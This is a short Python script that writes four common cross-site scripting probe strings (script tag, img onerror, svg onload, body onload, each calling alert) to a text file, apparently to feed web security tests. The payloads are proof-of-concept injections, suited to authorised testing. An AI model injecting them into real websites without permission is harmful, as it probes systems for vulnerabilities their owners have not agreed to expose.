import os

payloads = [
"<script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"'><svg/onload=alert(1)>",
"<body onload=alert(1)>"
]

# ensure data folder exists
os.makedirs("data", exist_ok=True)

with open("data/generated_payloads.txt","w") as f:
    for p in payloads:
        f.write(p+"\n")

print("Payloads generated successfully")
